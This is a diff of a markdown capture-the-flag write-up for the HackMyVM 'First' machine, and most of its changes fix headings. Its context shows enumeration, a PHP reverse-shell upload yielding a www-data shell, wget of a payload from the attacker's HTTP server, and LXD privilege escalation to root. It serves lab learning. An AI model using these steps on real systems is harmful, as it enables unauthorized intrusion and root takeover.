@@ -89,6 +89,8 @@ ncftp /first > mget *
 first_Logo.jpg:                                         32.74 kB    6.09 MB/s  
 ncftp /first > exit
 ```
+## STEGSEEK
+	
 ```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/First]
 └─$ stegseek first_Logo.jpg                 
@@ -113,7 +115,7 @@ Recipe : From Hex (auto)
 Input : 2f 74 30 64 30 5f 6c 31 73 74 5f 66 30 72 5f 66 31 72 35 74
 Output : /t0d0_l1st_f0r_f1r5t
 
-##Visiting view-source:http://10.1.1.45/
+## Visiting view-source:http://10.1.1.45/
 
 ```html
 todo for first:
@@ -125,7 +127,7 @@ todo for first:
 ```
 This gives us a clue. Its ferox time
 
-#FerroxBuster 
+## FerroxBuster 
 ```bash
 ┌──(coolatos㉿CooLaToS)-[~/HMV/First]
 └─$ feroxbuster -e -x txt,php,html,zip,htm,bak,pem -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $url/t0d0_l1st_f0r_f1r5t -t 500 -o ferox-$ip-td.log
@@ -160,7 +162,7 @@ by Ben "epi" Risher 🤓                 ver: 2.7.1
 [####################] - 0s   1764368/1764368 0/s     http://10.1.1.45/t0d0_l1st_f0r_f1r5t/uploads => Directory listing
 [####################] - 0s   1764368/1764368 0/s     http://10.1.1.45/t0d0_l1st_f0r_f1r5t/photos => Directory listing
 ```
-##Reverse Shell 
+## Reverse Shell 
 Upload shell.php to http://10.1.1.45/t0d0_l1st_f0r_f1r5t/upload.php
 (I use pentestmonkey)
 ```bash
@@ -185,7 +187,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 sh: 0: can't access tty; job control turned off
 $ 
 ```
-##Upgrade Shell
+## Upgrade Shell
 ```terminal
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 
@@ -222,7 +224,7 @@ first@first:/tmp$ cd
 first@first:~$ id
 uid=1000(first) gid=1000(first) groups=1000(first),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
 ```
-##LXD Privilage Escalation  
+## LXD Privilage Escalation  
   
 <h1 align="center"> LXD Priv Esc: <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></h1/>
 
@@ -246,6 +248,8 @@ Resolving deltas: 100% (15/15), done.
 ┌──(coolatos㉿CooLaToS)-[~/HMV/First/lxd-alpine-builder]
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+
 first@first:~$ wget $ip/alpine-v3.13-x86_64-20210218_0139.tar.gz
 --2022-08-29 08:01:15--  http://10.1.1.2/alpine-v3.13-x86_64-20210218_0139.tar.gz
 Connecting to 10.1.1.2:80... connected.
@@ -285,6 +289,9 @@ first@first:~$ lxc exec mycontainer /bin/sh
 uid=0(root) gid=0(root)
 ~ # cd /root
 ~ # ls
+```
+## Root Flag
+```bash
 ~ # cd /mnt
 /mnt # ls
 root
